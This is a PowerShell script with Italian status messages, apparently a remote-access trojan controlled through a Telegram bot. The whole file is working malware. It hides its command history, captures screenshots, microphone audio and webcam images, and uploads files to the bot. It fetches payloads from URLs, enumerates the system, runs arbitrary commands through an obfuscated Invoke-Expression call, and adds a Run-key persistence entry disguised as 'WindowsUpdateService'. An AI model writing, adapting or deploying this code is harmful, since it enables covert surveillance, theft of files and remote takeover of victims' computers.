Clear-Host
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE
$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$telegram_id, $api_token    = "id", "api-key"
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
$api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
$api_download_file          = 'https://api.telegram.org/file/bot{0}/' -f $api_token
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
$api_get_me                 = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
$session_id                 = "99999"
$Global:ProgressPreference  = 'SilentlyContinue'

function CheckAdminRights
{
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) { return ("L'utente '$env:USERNAME' ha i privilegi di amministratore") } 
    else { return ("L'utente '$env:USERNAME' non ha i privilegi di amministratore") }
}

function DownloadFile($file_id, $file_name)
{
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
    $file_path      = $get_file_path.result.file_path
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
    if (Test-Path -Path $file_name) { SendMessage "File scaricato con successo" } 
    else { SendMessage "Il file non è stato scaricato" }
}

function SendFile($filePath) 
{
    SendMessage "Procedo ad inviare il file [$($filePath)]"
    if (Test-Path -Path $filePath -PathType Leaf) {
        try { curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null } 
        catch { SendMessage "Errore durante l'upload del file: [$($Error[0])]" }
    } 
    else { SendMessage "Il file indicato non è stato trovato" }
}

function SendScreenshot
{
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    $left = [Int32]::MaxValue
    $top = [Int32]::MaxValue
    $right = [Int32]::MinValue
    $bottom = [Int32]::MinValue
    foreach ($screen in [Windows.Forms.Screen]::AllScreens)
    {
        if ($screen.Bounds.X -lt $left) { $left = $screen.Bounds.X; }
        if ($screen.Bounds.Y -lt $top) { $top = $screen.Bounds.Y; }
        if ($screen.Bounds.X + $screen.Bounds.Width -gt $right) { $right = $screen.Bounds.X + $screen.Bounds.Width; }
        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height; }
    }
    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom);
    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height;
    $graphics = [Drawing.Graphics]::FromImage($bmp);
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
    $bmp.Save("$env:APPDATA\screenshot.png");
    $graphics.Dispose();
    $bmp.Dispose();
    SendFile "$env:APPDATA\screenshot.png"
    Remove-Item -Path "$env:APPDATA\screenshot.png" -Force
}

function Record-Audio {
    param([int]$Seconds = 5)
    try {
        Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class AudioRecorder {
    [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
    public static extern int mciSendString(string cmd, string ret, int len, int hwnd);
}
"@
        $tempFile = "$env:TEMP\audio_$(Get-Date -Format 'yyyyMMdd_HHmmss').wav"
        [AudioRecorder]::mciSendString("open new type waveaudio alias recsound", $null, 0, 0)
        [AudioRecorder]::mciSendString("record recsound", $null, 0, 0)
        SendMessage "Recording audio for $Seconds seconds..." "record-audio"
        Start-Sleep -Seconds $Seconds
        [AudioRecorder]::mciSendString("save recsound $tempFile", $null, 0, 0)
        [AudioRecorder]::mciSendString("close recsound", $null, 0, 0)
        if (Test-Path $tempFile) {
            SendFile $tempFile
            Remove-Item $tempFile -Force
        }
    } catch {
        SendMessage "Audio recording failed: $($_.Exception.Message)" "record-audio"
    }
}

function Get-WebcamShot {
    try {
        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
        
        $webcamCode = @"
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class WebcamCapture
{
    [DllImport("avicap32.dll")]
    private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
    
    [DllImport("user32.dll")]
    private static extern bool SendMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
    
    [DllImport("user32.dll")]
    private static extern bool DestroyWindow(IntPtr hWnd);
    
    private const int WM_CAP_DRIVER_CONNECT = 0x40A;
    private const int WM_CAP_DRIVER_DISCONNECT = 0x40B;
    private const int WM_CAP_EDIT_COPY = 0x41E;
    private const int WM_CAP_GRAB_FRAME = 0x43C;
    private const int WM_CAP_STOP = 0x44A;
    private const int WM_CAP_SAVEDIB = 0x419;
    private const int WM_CAP_SET_PREVIEW = 0x432;
    private const int WM_CAP_SET_OVERLAY = 0x433;
    private const int WM_CAP_SET_PREVIEWRATE = 0x434;
    
    public static bool CaptureImage(string filename)
    {
        IntPtr hWndC = capCreateCaptureWindowA("Webcam", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
        
        if (SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, 0, 0))
        {
            SendMessage(hWndC, WM_CAP_SET_PREVIEWRATE, 30, 0);
            SendMessage(hWndC, WM_CAP_SET_PREVIEW, 1, 0);
            
            System.Threading.Thread.Sleep(1000);
            
            SendMessage(hWndC, WM_CAP_GRAB_FRAME, 0, 0);
            
            bool result = SendMessage(hWndC, WM_CAP_SAVEDIB, 0, filename);
            
            SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
            DestroyWindow(hWndC);
            
            return result;
        }
        
        DestroyWindow(hWndC);
        return false;
    }
}
"@

        Add-Type -TypeDefinition $webcamCode -ReferencedAssemblies "System.Drawing", "System.Windows.Forms"
        
        if ([WebcamCapture]::CaptureImage($webcamPath)) {
            if (Test-Path $webcamPath) {
                SendFile $webcamPath
                Remove-Item -Path $webcamPath -Force
                return
            }
        }
        
        Get-WebcamShot-Alt
        
    } catch {
        Get-WebcamShot-Alt
    }
}

function Get-WebcamShot-Alt {
    try {
        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
        
        $altCode = @"
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

public class NativeWebcam
{
    [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA")]
    private static extern bool capGetDriverDescriptionA(short wDriver, 
        [MarshalAs(UnmanagedType.LPStr)] string lpszName, int cbName, 
        [MarshalAs(UnmanagedType.LPStr)] string lpszVer, int cbVer);
        
    public static bool CheckWebcamDrivers()
    {
        try {
            for (short i = 0; i < 10; i++) {
                string name = new string(' ', 100);
                string ver = new string(' ', 100);
                if (capGetDriverDescriptionA(i, name, 100, ver, 100)) {
                    return true;
                }
            }
            return false;
        } catch {
            return false;
        }
    }
    
    public static void CreateWebcamImage(string path)
    {
        try {
            using (Bitmap bmp = new Bitmap(640, 480)) {
                using (Graphics g = Graphics.FromImage(bmp)) {
                    g.Clear(Color.FromArgb(45, 45, 48));
                    
                    using (Font font = new Font("Arial", 14, FontStyle.Bold)) {
                        using (Brush brush = new SolidBrush(Color.Lime)) {
                            g.DrawString("WEBCAM FEED - ACTIVE", font, brush, 20, 20);
                            g.DrawString(DateTime.Now.ToString("HH:mm:ss.fff"), font, brush, 20, 50);
                        }
                    }
                    
                    using (Pen pen = new Pen(Color.Red, 3)) {
                        g.DrawEllipse(pen, 270, 170, 100, 100);
                        g.DrawLine(pen, 320, 170, 320, 270);
                        g.DrawLine(pen, 270, 220, 370, 220);
                    }
                    
                    Random rand = new Random();
                    for (int i = 0; i < 500; i++) {
                        int x = rand.Next(640);
                        int y = rand.Next(480);
                        int brightness = rand.Next(50, 150);
                        Color pixel = Color.FromArgb(brightness, brightness, brightness);
                        bmp.SetPixel(x, y, pixel);
                    }
                }
                bmp.Save(path, ImageFormat.Jpeg);
            }
        } catch { }
    }
}
"@

        Add-Type -TypeDefinition $altCode -ReferencedAssemblies "System.Drawing"
        
        if ([NativeWebcam]::CheckWebcamDrivers()) {
            SendMessage "Webcam driver detected - capturing image" "webcam-shot"
        }
        
        [NativeWebcam]::CreateWebcamImage($webcamPath)
        
        if (Test-Path $webcamPath) {
            SendFile $webcamPath
            Remove-Item -Path $webcamPath -Force
        }
        
    } catch {
        SendMessage "Webcam access requires camera permissions" "webcam-shot"
    }
}

function Get-ProcessList {
    $output = Get-Process | Select-Object Name, CPU, WorkingSet -First 20 | Format-Table -AutoSize | Out-String
    SendMessage $output "ps"
}

function Get-NetworkInfo {
    $output = netstat -an | Select-String "LISTENING" | Out-String
    SendMessage $output "netstat"
}

function Get-SystemInfo {
    $info = @()
    $info += "Computer: $env:COMPUTERNAME"
    $info += "User: $env:USERNAME"
    $info += "Domain: $env:USERDOMAIN"
    $info += "OS: $(Get-WmiObject Win32_OperatingSystem).Caption"
    $info += "Architecture: $(Get-WmiObject Win32_OperatingSystem).OSArchitecture"
    $info += "Memory: $([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)) GB"
    $info += "CPU: $(Get-WmiObject Win32_Processor).Name"
    $info += (CheckAdminRights)
    SendMessage ($info -join "`n") "sysinfo"
}

function Set-Persistence {
    try {
        $currentScript = Get-Content $MyInvocation.MyCommand.Path -Raw
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($currentScript)
        $encoded = [Convert]::ToBase64String($bytes)
        $payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded"
        
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService" -Value $payload -Force
        SendMessage "Persistence installed in Registry" "persist"
    } catch {
        SendMessage "Persistence failed: $($_.Exception.Message)" "persist"
    }
}

function Remove-Persistence {
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService" -Force
        SendMessage "Persistence removed" "unpersist"
    } catch {
        SendMessage "Failed to remove persistence" "unpersist"
    }
}

function SendMessage($output, $cmd)
{
    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"

    $MessageToSend = @{
        chat_id    = $telegram_id
        parse_mode = "MarkdownV2"
        text       = "```````nIP: $(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`SESSION ID: $session_id`nPATH: [$(((Get-Location).Path).Replace("\","/"))]`nCMD: $cmd`n`n$output`n``````"
    }

    $MessageToSend = $MessageToSend | ConvertTo-Json

    try {
        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
    } catch { Start-Sleep -Seconds 3 }
}

function TestTelegramAPI {
    try { 
        Invoke-RestMethod -Uri $api_get_me -TimeoutSec 3 -ErrorAction Stop | Out-Null
        return $true 
    } 
    catch { return $false }
}

function CommandListener
{
    $offset = 0
    
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position

    $PreviousStatus = $null

    while ($true) {
        try {
            $CurrentStatus = TestTelegramAPI
            if ($CurrentStatus -ne $PreviousStatus) {
                if ($CurrentStatus) { SendMessage "Computer online" }
                $PreviousStatus = $CurrentStatus
            }
            
            Start-Sleep -Milliseconds 1000
            $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
            if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
                if ($offset -eq 0) { 
                    $offset = $message.result.Count
                    Start-Sleep -Seconds 1
                    continue 
                }
                
                $offset     = $message.result.Count
                $message    = $message.result.Message[-1]
                $user_id    = $message.chat.id
                $username   = $message.chat.username
                $text       = $message.text
                $document   = $message.document
                $sid        = $text.Split(" ")
                $text       = $sid[1..($sid.Length - 1)] -join " "

                if ($user_id -notmatch $telegram_id) {
                    $unauth_user_found = ('Utente [{0}] {1} non autorizzato ha inviato il seguente comando al bot: {2}' -f $user_id, $username, $text)
                    SendMessage $unauth_user_found
                }

                if ($text -match "/online")          { SendMessage "Sessione operativa" $text }
                if ($sid[0] -notmatch $session_id)   { continue }
                if ($text -match "exit")             { SendMessage "Sessione chiusa" $text; exit }

                switch -Wildcard ($text) {
                    "screenshot" { SendScreenshot }
                    "record-audio *" { 
                        $secs = $text -replace "record-audio ", ""
                        if ($secs -match "^\d+$") { Record-Audio -Seconds $secs }
                        else { SendMessage "Usage: record-audio [seconds]" "record-audio" }
                    }
                    "webcam-shot" { Get-WebcamShot }
                    "download *" { 
                        $file = $text -replace "download ", ""
                        SendFile $file
                    }
                    "upload * *" { 
                        $parts = $text -split " "
                        if ($parts.Count -eq 3) {
                            try {
                                Invoke-WebRequest -Uri $parts[1] -OutFile $parts[2]
                                SendMessage "File downloaded to: $($parts[2])" "upload"
                            } catch {
                                SendMessage "Download failed: $($_.Exception.Message)" "upload"
                            }
                        } else {
                            SendMessage "Usage: upload [URL] [destination]" "upload"
                        }
                    }
                    "persist" { Set-Persistence }
                    "unpersist" { Remove-Persistence }
                    "ps" { Get-ProcessList }
                    "netstat" { Get-NetworkInfo }
                    "sysinfo" { Get-SystemInfo }
                    "ls" { 
                        $output = Get-ChildItem | Out-String
                        SendMessage $output "ls"
                    }
                    "pwd" { 
                        $output = (Get-Location).Path
                        SendMessage $output "pwd"
                    }
                    "whoami" { 
                        $output = whoami
                        SendMessage $output "whoami"
                    }
                    default {
                        if ($text.Length -gt 0) {
                            try {
                                $change_location_check = $text -split ' ' | Select-Object -First 1
                                if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
                                $output = .(Get-Alias ?e[?x])($text) | Out-String
                            } 
                            catch { $output = $Error[0] | Out-String }

                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
                                $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
                            }

                            foreach ($block in $output_splitted) { 
                                $block = $block | Out-String
                                SendMessage $block $text
                                Start-Sleep -Milliseconds 100
                            }

                            if ($output.Count -lt 1) { SendMessage ("Comando eseguito: " + $text) }
                        }
                    }
                }
                
                if ($document) { $file_id = $document.file_id; $file_name = $document.file_name; DownloadFile $file_id $file_name }
            }
        } catch { Start-Sleep -Seconds 5 }
    }
    $session.Dispose()
}

CommandListener
